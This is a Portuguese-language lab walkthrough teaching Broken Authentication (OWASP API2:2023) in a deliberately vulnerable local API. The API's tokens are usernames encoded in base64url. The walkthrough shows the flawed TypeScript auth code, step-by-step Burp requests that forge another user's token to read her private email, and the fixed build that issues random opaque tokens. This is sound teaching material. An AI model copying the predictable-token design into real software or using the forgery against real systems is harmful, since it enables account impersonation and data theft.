# Walkthrough — auth-predictable-token

## 1. Contexto

Uma API de perfil serve `GET /users/:handle`: autentica o chamador com um Bearer token, confere que o registro é do próprio chamador, e devolve o perfil — incluindo um `email` privado. A guarda de posse está certa — você só lê o seu próprio perfil. A falha está uma camada abaixo dela, no token que o login entrega: ele não é um valor aleatório, é **o seu nome de usuário, codificado em base64url**, e a authentication o resolve *decodificando* ele e confiando no nome. Isto é **Broken Authentication** — **API2:2023** no OWASP API Security Top 10.

Este átomo é uma virada na série. Os sete primeiros perguntaram, de sete formas, **"você pode fazer isto?"** — de quem é o objeto, você pode chamar esta função, quais campos pode ver ou setar — e cada um deles confiou no token pra dizer quem *você* é. Este pergunta o que está por baixo: **você é mesmo quem diz ser?** Essa é a linha entre **authentication** — provar *quem você é* — e **authorization** — provar *que você pode*. Um **opaque token** é uma credencial que não carrega significado legível: só o servidor, com um registro dela, pode dizer de quem é. O token vulnerable aqui é o oposto de opaco, e é esse o bug inteiro. **Impersonation** é se apresentar como outro usuário; você vai fazer isso com a `alice`, reconstruindo o token dela a partir do nome dela.

Isto é uma **API — não há trilha browser.** Cada request abaixo é um bloco que você cola no **Burp Repeater** (que reenvia um único request pra você editar e observar). A ferramenta de linha de comando `base64` lê e constrói os tokens. Se você ainda não configurou o Burp, os mesmos requests rodam no `curl`. É esse o conjunto inteiro de ferramentas.

## 2. Ache o bug

Abra [`vulnerable/app.ts`](./vulnerable/app.ts). A única função a ler é o `authenticate` — não uma rota, o próprio helper de autenticação:

```ts
function issueToken(user: string): string {
  return Buffer.from(user).toString("base64url");           // VULNERABLE: the name, encoded -- not entropy
}

function authenticate(req: express.Request): string | null {
  // VULNERABLE: decode the token and trust whoever it spells.
  const header = req.header("authorization") ?? "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : "";
  return Buffer.from(token, "base64url").toString("utf8") || null;
}
```

O login emite o token passando o username por `base64url` — uma **codificação** reversível, não criptografia: não há chave nem segredo, qualquer um a computa nos dois sentidos. A authentication então faz o inverso, decodificando o token de volta num nome e confiando nele. Então a pergunta de auditoria não é a do BOLA — *"cadê a guarda de posse?"* (ela está presente, na rota, e está correta) — é **"o token é imprevisível pra quem não o recebeu?"** A resposta: não. O token *é* o nome. Quem sabe um handle produz o token daquele handle.

- **O contraste com os sete anteriores está no código.** O build fixed — e todo átomo antes deste — usa o **mesmo** `base64url`, mas sobre `randomBytes(24)` em vez do nome, e **guarda** o resultado num mapa `token -> user` pra resolver por lookup. Mesma codificação, fonte oposta, resolução oposta. A string do token parece igual; o que mudou é de onde ela vem e como é lida.
- **A rota não é o bug.** O `GET /users/:handle` tem uma guarda de posse correta; ela confia no `caller` que o `authenticate` devolve, como toda rota deve. A traição está *dentro* do `authenticate`, onde esse caller é inventado a partir do token. Não procure um check ausente na rota — não há.

## 3. Como funciona a auth deste lab — abra o seu token

`POST /login` recebe um username e devolve um Bearer token. Ele não pede senha: um atalho deliberado do laboratório, não o bug. Aponte o Burp pra API vulnerable em `127.0.0.1:8208` e logue como você mesmo.

> `Método: POST · Logando como: clancy (você)`

```
POST /login HTTP/1.1
Host: 127.0.0.1:8208
Content-Type: application/json

{"user": "clancy"}
```

Response — `200`:

```json
{"token":"Y2xhbmN5"}
```

Agora olhe firme pra esse token, porque ele é a lição inteira. Ele não é aleatório — logue de novo e você recebe a *mesma* string, toda vez. Decodifique:

```bash
echo -n Y2xhbmN5 | base64 -d
```

→ `clancy`. **Não é opaco — é o seu nome.** Sem segredo, sem entropia: o "token" é um envelope transparente com o seu handle dentro. Um token opaco de verdade (que o build fixed emite) decodificaria pra bytes aleatórios, não uma palavra.

- **Nota de codificação:** `clancy` (6 bytes) codifica pra `Y2xhbmN5` sem padding, então `base64` e `base64url` produzem a mesma string aqui e o `base64 -d` a lê de volta direto. Nem todo handle é tão arrumado — o próximo passo bate no caso de padding, com a `alice`.

Este passo é **descoberta**: você só *leu* o que o seu próprio token é. Ainda não forjou nada. O próximo constrói o de outra pessoa.

## 4. Exploit — três movimentos, e o clímax é um header trocado

Aponte o Burp pra API vulnerable em `127.0.0.1:8208`, ainda logado como `clancy`.

**Movimento um — o baseline.** Peça o perfil da `alice` com o seu próprio token:

> `Método: GET · Alvo: alice (não seu) · Isola: a posse existe e morde — a sua identidade real não é alice`

```
GET /users/alice HTTP/1.1
Host: 127.0.0.1:8208
Authorization: Bearer Y2xhbmN5
```

Response — **`403`**, corpo `Forbidden`. **Leia esse `403` com cuidado: a rota tem check de posse e ele funciona.** Você, sendo `clancy`, não consegue ler o perfil da `alice`. Guarde esse resultado — é ele que prova, no Step 5, que isto não é BOLA.

**Movimento dois — forje o token da vítima.** O token é o nome em base64url, e o nome da vítima é o handle público `alice`. Construa:

```bash
echo -n alice | base64
```

→ `YWxpY2U=`.

> **O padding, uma vez, por inteiro (este é o único lugar onde importa).** `alice` (5 bytes) codifica pra 7 caracteres base64 **mais um padding `=`**, então `echo -n alice | base64` dá `YWxpY2U=` (com o `=`), enquanto a forma **base64url** canônica — a que o próprio servidor emitiria — tira o padding: `YWxpY2U`. **O servidor aceita as duas:** o decoder base64url do Node tolera o `=`, então `YWxpY2U` e `YWxpY2U=` decodificam pra `alice`. Pra estes handles minúsculos as duas codificações diferem *só* nesse `=` final — nunca nos caracteres `+`/`/`, que nenhum desses bytes gera. Se um handle gerasse `+` ou `/`, aí `base64` e `base64url` divergiriam de verdade e você usaria `basenc --base64url`. Aqui, qualquer uma das strings funciona.

**Movimento três — impersonation.** Reenvie o *mesmo* `GET /users/alice`, mudando **só** o header `Authorization` pro token forjado:

> `Método: GET · Alvo: alice · Isola: mesma URL, mesma guarda correta — mudou só quem o token diz que você é`

```
GET /users/alice HTTP/1.1
Host: 127.0.0.1:8208
Authorization: Bearer YWxpY2U
```

Response — **`200`**:

```json
{"handle":"alice","displayName":"Alice Nguyen","email":"alice@secret.example"}
```

Mesma URL, mesma rota, a mesma guarda de posse correta — e a resposta oposta. Você está lendo o email privado da `alice`. Você não passou por baixo da guarda; você a **satisfez**, porque forjou a identidade que ela compara. O caller que ela viu era `alice`, então `handle === caller` valeu, e ela te serviu o registro dela.

> **A guarda de posse estava certa nas duas vezes — você só mudou o nome que o token soletra, e um token que soletra o seu nome é um nome que qualquer um soletra.**

## 5. Passo — O que a vuln NÃO é

Um Bearer token bem-formado lendo um registro atrás de uma guarda de posse correta é fácil de ler errado. Duas leituras pra desmontar com firmeza, e uma terceira que vale uma frase — e você já tem toda a evidência.

**"Isto é BOLA — li um objeto que não era meu porque faltou um check."** Esta é a leitura errada pra matar, então dê mais peso a ela. Volte ao baseline do Step 4: `GET /users/alice` com o seu **próprio** token respondeu **`403`**. O check de posse está presente e morde. Você **não** leu o objeto da `alice` por um check de autorização ausente — você **virou** a `alice`, e aí a autorização, funcionando corretamente, te entregou o objeto dela. Authorization certa, authentication quebrada. Em BOLA a identidade é real e o check falta; aqui o check está correto e a **identidade é falsa**. (É a mesma guarda de posse que o `bfla-method-based` e o `bopla-excessive-exposure` usam, comparada antes de qualquer lookup — o [`DIFF.md`](./DIFF.md) carrega o argumento de status code.)

**"Isto é roubo de token — você interceptou ou deu replay na sessão da `alice`."** Você não interceptou nada. Não houve sniff de rede, cookie roubado, nem token capturado e *reenviado*. Você **construiu** o token da `alice` do zero, a partir do **handle** dela — que é público (aparece no login, pela plataforma). É fabricação a partir de dado público, não furto de um segredo. A diferença importa: contra roubo você rotaciona o token vazado; contra isto não há o que rotacionar — todo token é derivável.

**Uma terceira leitura, menor: "é cripto fraca — o token usa um hash ou cifra ruim."** base64url **não** é criptografia — é codificação. Não há chave, nem algoritmo a quebrar, só um envelope a abrir. A falha não é que a cripto é fraca; é que **não há segredo nenhum**. É por isso que *assinar* o token (dar-lhe integridade) não é a lição — ver o fix.

Junte tudo. A rota de perfil **não tem bug de autorização** — o check de posse está correto, e o `403` do baseline provou. A falha é anterior: o **token não prova identidade**, porque qualquer um o produz a partir de um nome público. Você não leu um objeto alheio (não é BOLA), não roubou uma credencial (não é replay), nem quebrou cripto (não há). Você **forjou a identidade**.

## 6. Passo — Impacto

**Impersonation total de qualquer usuário cujo handle você saiba.** Handles são públicos — aparecem no login e pela plataforma. Para *cada* um, você deriva o token e se autentica como aquele usuário, alcançando o que a sessão dele alcança; aqui, o `email` privado dele. O ataque não se limita a uma vítima: é uma chave-mestra cortada de um nome.

A autorização do sistema vira inútil sem estar errada. Todo check que os sete átomos anteriores ensinaram — objeto, função, propriedade — continua rodando corretamente e **serve o atacante**, porque pro servidor ele *é* a vítima. É isso que torna esta classe tão grave: ela não derruba um muro, ela forja o crachá que abre todos. E **não é revogável**: o build vulnerable não guarda estado de token, então não há o que invalidar — enquanto um handle existir, o token dele é derivável, e um restart não muda nada.

O que o impacto **não** é:

- **Não é escalação de privilégio.** Não há admin nem papel aqui. Você vira *outro usuário comum*, não um superusuário.
- **Não é RCE nem dump de base.** Você lê um perfil por vez — a identidade que forjou. O achado é impersonation mais o dado privado da vítima, e isso basta.
- **Não é bypass de autorização.** A autorização *funcionou*; ela só autorizou uma identidade falsa. O que foi burlado foi a **autenticação**.

## 7. Por que o fix funciona (porta 8308)

Aponte o Burp pra API fixed em `127.0.0.1:8308` e logue lá como `clancy` — cada build guarda o próprio mapa de tokens, então você precisa de um token novo.

```
POST /login HTTP/1.1
Host: 127.0.0.1:8308
Content-Type: application/json

{"user": "clancy"}
```

Response — `200`, e o token é **aleatório** desta vez (mostrado como `<clancy-token>`; o seu vai diferir):

```json
{"token":"DEH8P81by76S571D2QtUsQCx36XykFha"}
```

Decodifique e não sai nada legível — `echo -n <clancy-token> | base64 -d` são 24 bytes binários, não um nome. O token virou **opaco**. O seu self-read continua funcionando:

> `Método: GET · Alvo: clancy (seu) · Isola: a feature está intacta — o dono ainda lê o próprio perfil`

```
GET /users/clancy HTTP/1.1
Host: 127.0.0.1:8308
Authorization: Bearer <clancy-token>
```

Response — **`200`**, `{"handle":"clancy","displayName":"Clancy Park","email":"clancy@mail.example"}`.

Agora repita a forja. `echo -n alice | base64` ainda produz `YWxpY2U=`, mas mande:

> `Método: GET · Alvo: alice · Isola: o token forjado agora é desconhecido pro servidor`

```
GET /users/alice HTTP/1.1
Host: 127.0.0.1:8308
Authorization: Bearer YWxpY2U
```

Response — **`401`**, corpo `Unauthorized`. O servidor não reconhece o token: ele nunca foi emitido, então não está no mapa `token -> user`, e não há identidade *dentro* dele pra decodificar. **O token não diz mais quem você é — só o registro do servidor diz.** O `403` de posse e o `401` de token ausente não mudam: `GET /users/alice` com o token real do `clancy` ainda é `403`, e sem token ainda é `401` com `WWW-Authenticate: Bearer`.

O fix é o bloco de autenticação: `randomBytes` e um vínculo guardado no login, `TOKENS.get` na resolução. O [`DIFF.md`](./DIFF.md) trabalha isso — por que a identidade não pode viajar dentro do token de jeito nenhum, por que a mudança toca três pontos inseparáveis em vez de uma linha, e por que *assinar* o token (o quase-fix tentador) bloqueia este exploit mas mantém a identidade no token e por isso resolve o problema errado.

O walkthrough termina aqui. O achado é uma identidade forjada a partir de um nome público; o fix é um token que o cliente não consegue autorar.
